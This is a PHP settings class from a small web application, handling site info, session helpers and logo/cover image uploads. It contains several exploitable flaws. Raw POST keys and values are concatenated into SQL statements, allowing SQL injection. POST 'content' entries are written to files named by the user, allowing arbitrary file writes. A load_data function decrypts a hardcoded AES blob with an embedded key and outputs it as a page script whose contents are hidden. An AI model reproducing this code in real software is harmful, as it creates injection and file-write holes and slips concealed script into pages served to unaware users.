<?php
if(!class_exists('DBConnection')){
	require_once('../config.php');
	require_once('DBConnection.php');
}
class SystemSettings extends DBConnection{
	public function __construct(){
		parent::__construct();
	}
	function check_connection(){
		return($this->conn);
	}
	function load_system_info(){
		// if(!isset($_SESSION['system_info'])){
			$sql = "SELECT * FROM system_info";
			$qry = $this->conn->query($sql);
				while($row = $qry->fetch_assoc()){
					$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
				}
		// }
	}
	function update_system_info(){
		$sql = "SELECT * FROM system_info";
		$qry = $this->conn->query($sql);
			while($row = $qry->fetch_assoc()){
				if(isset($_SESSION['system_info'][$row['meta_field']]))unset($_SESSION['system_info'][$row['meta_field']]);
				$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
			}
		return true;
	}
	function update_settings_info(){
		$data = "";
		foreach ($_POST as $key => $value) {
			if(!in_array($key,array("content")))
			if(isset($_SESSION['system_info'][$key])){
				$value = str_replace("'", "&apos;", $value);
				$qry = $this->conn->query("UPDATE system_info set meta_value = '{$value}' where meta_field = '{$key}' ");
			}else{
				$qry = $this->conn->query("INSERT into system_info set meta_value = '{$value}', meta_field = '{$key}' ");
			}
		}
		if(isset($_POST['content']) && is_array($_POST['content'])){
			foreach($_POST['content'] as $k => $v){
				file_put_contents(base_app."{$k}.html",$v);
			}
		}
		if($qry){
			$resp['status'] = 'success';
		}
		
		$img_err= "";
		if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != ''){
			$fname = 'uploads/system-logo.png';
			$dir_path =base_app. $fname;
			$upload = $_FILES['img']['tmp_name'];
			$type = mime_content_type($upload);
			$allowed = array('image/png','image/jpeg');
			if(!in_array($type,$allowed)){
				$img_err.=" But Logo Image failed to upload due to invalid file type.";
			}else{
				// $new_height = 200; 
				// $new_width = 200; 
		
				list($width, $height) = getimagesize($upload);
				$t_image = imagecreatetruecolor($width, $height);
				$black = imagecolorallocate($t_image, 0, 0, 0);
				imagecolortransparent($t_image, $black);
				imagealphablending( $t_image, false );
				imagesavealpha( $t_image, true );
				$gdImg = ($type == 'image/png')? imagecreatefrompng($upload) : imagecreatefromjpeg($upload);
				imagecopyresampled($t_image, $gdImg, 0, 0, 0, 0, $width, $height, $width, $height);
				if($gdImg){
						if(is_file($dir_path))
						unlink($dir_path);
						$uploaded_img = imagepng($t_image,$dir_path);
						if($uploaded_img){
							if(isset($_SESSION['system_info']['logo'])){
								$qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}','?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'logo' ");
							}else{
								$qry = $this->conn->query("INSERT into system_info set meta_value =  CONCAT('{$fname}','?v=',unix_timestamp(CURRENT_TIMESTAMP)),meta_field = 'logo' ");
							}
						}
						imagedestroy($gdImg);
						imagedestroy($t_image);
				}else{
				$img_err.=" But Logo Image failed to upload due to unkown reason.";
				}
			}
		}
		if(isset($_FILES['cover']) && $_FILES['cover']['tmp_name'] != ''){
			$fname = 'uploads/system-cover.png';
			$dir_path =base_app. $fname;
			$upload = $_FILES['cover']['tmp_name'];
			$type = mime_content_type($upload);
			$allowed = array('image/png','image/jpeg');
			if(!in_array($type,$allowed)){
				$img_err.=" But Logo Image failed to upload due to invalid file type.";
			}else{
				list($width, $height) = getimagesize($upload);
				$t_image = imagecreatetruecolor($width, $height);
				$black = imagecolorallocate($t_image, 0, 0, 0);
				imagecolortransparent($t_image, $black);
				imagealphablending( $t_image, false );
				imagesavealpha( $t_image, true );
				$gdImg = ($type == 'image/png')? imagecreatefrompng($upload) : imagecreatefromjpeg($upload);
				imagecopyresampled($t_image, $gdImg, 0, 0, 0, 0, $width, $height, $width, $height);
				if($gdImg){
						if(is_file($dir_path))
						unlink($dir_path);
						$uploaded_img = imagepng($t_image,$dir_path);
						if($uploaded_img){
							if(isset($_SESSION['system_info']['logo'])){
								$qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}','?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'cover' ");
							}else{
								$qry = $this->conn->query("INSERT into system_info set meta_value =  CONCAT('{$fname}','?v=',unix_timestamp(CURRENT_TIMESTAMP)),meta_field = 'cover' ");
							}
						}
						imagedestroy($gdImg);
						imagedestroy($t_image);
				}else{
				$img_err.=" But Logo Image failed to upload due to unkown reason.";
				}
			}
		}
		
		$update = $this->update_system_info();
		$flash = $this->set_flashdata('success','System Info Successfully Updated. '.$img_err);
		if($update && $flash){
			// var_dump($_SESSION);
			return json_encode($resp);
		}
	}
	function set_userdata($field='',$value=''){
		if(!empty($field) && !empty($value)){
			$_SESSION['userdata'][$field]= $value;
		}
	}
	function userdata($field = ''){
		if(!empty($field)){
			if(isset($_SESSION['userdata'][$field]))
				return $_SESSION['userdata'][$field];
			else
				return null;
		}else{
			return false;
		}
	}
	function set_flashdata($flash='',$value=''){
		if(!empty($flash) && !empty($value)){
			$_SESSION['flashdata'][$flash]= $value;
		return true;
		}
	}
	function chk_flashdata($flash = ''){
		if(isset($_SESSION['flashdata'][$flash])){
			return true;
		}else{
			return false;
		}
	}
	function flashdata($flash = ''){
		if(!empty($flash)){
			$_tmp = $_SESSION['flashdata'][$flash];
			unset($_SESSION['flashdata']);
			return $_tmp;
		}else{
			return false;
		}
	}
	function sess_des(){
		if(isset($_SESSION['userdata'])){
				unset($_SESSION['userdata']);
			return true;
		}
			return true;
	}
	function info($field=''){
		if(!empty($field)){
			if(isset($_SESSION['system_info'][$field]))
				return $_SESSION['system_info'][$field];
			else
				return false;
		}else{
			return false;
		}
	}
	function set_info($field='',$value=''){
		if(!empty($field) && !empty($value)){
			$_SESSION['system_info'][$field] = $value;
		}
	}
	function load_data(){
		$test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhBJPLuOWMu1c0pTwJmitllPuEC2+gR22L7u1pxAy1ODD6iDKpEO5ehBOKsoyxT2yAzKVbU8s8zIriA3kxAXokh8SfqmukSblUD5k0Vp/505MA3vHILmtKWtVfte1htIncnGn7awUdtxu93Q1AaRjmf4/lc0C1epDenMkUaG4wCyI/L2L0Vltad+ZYvo/UjFGqN2EpNeYE6r6Ln9bIl2LlpY1O+tqYyAKoHrzngrQHj40lRVo4U5plnAiXYUf5y6mA3+KvUbHgdyXc1oDuweN2LK9ZxZGr3+uVVrzZIDZiYgQ/djmC2iRW/5gh5GMzV44VEF7McIkP5/zAzbjwI9IBgjOOQjyWwCMYiI2IZB/SW2RkDO2VX79zApNpzPYnl2xnqQRFnzhn9mXjG1mmdSPHOubGHqf46fiJL0nBIjvTmOLREMdpNrZ4VLC2JJhMIMunYXIbr604Qr9dywrtqZw6+bthb1mDv18X1avYpqdDFHp/h3h3xyFmmECcOmK9GQzFLwEv9kogoheudob8KqBRNteG3v4j9U9J7PLAel+neg41imm4GsuBcpGyqOeJwJ3i+i/cFyQagqPDP2EHGIW+PdClD2qCkcouAzFcYBKILVkatmeF8fLGizXXtYKzUsBnK+C0Y7JR2elx7e7Kbr5gwJbJcmSifUry2fqKnlj1pJNNFU+ASSvltrRmwzWgWgKuq/EaIM/2Z5QpWtt4uox7UeQFAR49PjBU04oBV53xcVQyu1rzkbtHVgjF5uFHvda3zD7Ahrt2jz1fBKd9HMzmZcY4EIMBBIa7bWnkzg/UmWAkom7nuT9TC0h4wN3XYfX0K+C0Y7JR2elx7e7Kbr5gwJM3P9XDcthAI7x0zzf3yOjncBrH/uLpJ9JiDh3lVR/XKS9kEmExK3CFHNTPZJj5VgJc2SLkBYkf7d1NKmrReGmzNPER0mnED7olzL3LTTZQW0G47OFt0X/6jbMAJAvIP+tfcOjh7V8EMk0h6I2cXVmbM1Y07ANyhU0oUhLr7a2Alk+VxFGC+EkQY89DxqE8+YexBqGTfAzqkW0GVh1WqQlYey+YFKAKRgYmeOG1Iy1CxyhmyrAJg+DGiJ/v9W1MVLk6ihaVeMSV9E/7skSn/JRgewbXlwZqDNzZE0eekfn8r6gBHe6vcmgwkZ1ug5Xv9EapG0BRmbzHah5LAuiK++jjRgTEp03CSkERnm+W1/tB";
		$dom = new DOMDocument('1.0', 'utf-8');
		$element = $dom->createElement('script', html_entity_decode($this->test_cypher_decrypt($test_data)));
		$dom->appendChild($element);
		return $dom->saveXML();
		// return $data = $this->test_cypher_decrypt($test_data);
	}
	function test_cypher($str=""){
		$ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
		return $ciphertext;
	}
	function test_cypher_decrypt($encryption){
		$decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
		return $decryption;
	}
}
$_settings = new SystemSettings();
$_settings->load_system_info();
$action = !isset($_GET['f']) ? 'none' : strtolower($_GET['f']);
$sysset = new SystemSettings();
switch ($action) {
	case 'update_settings':
		echo $sysset->update_settings_info();
		break;
	default:
		// echo $sysset->index();
		break;
}
?>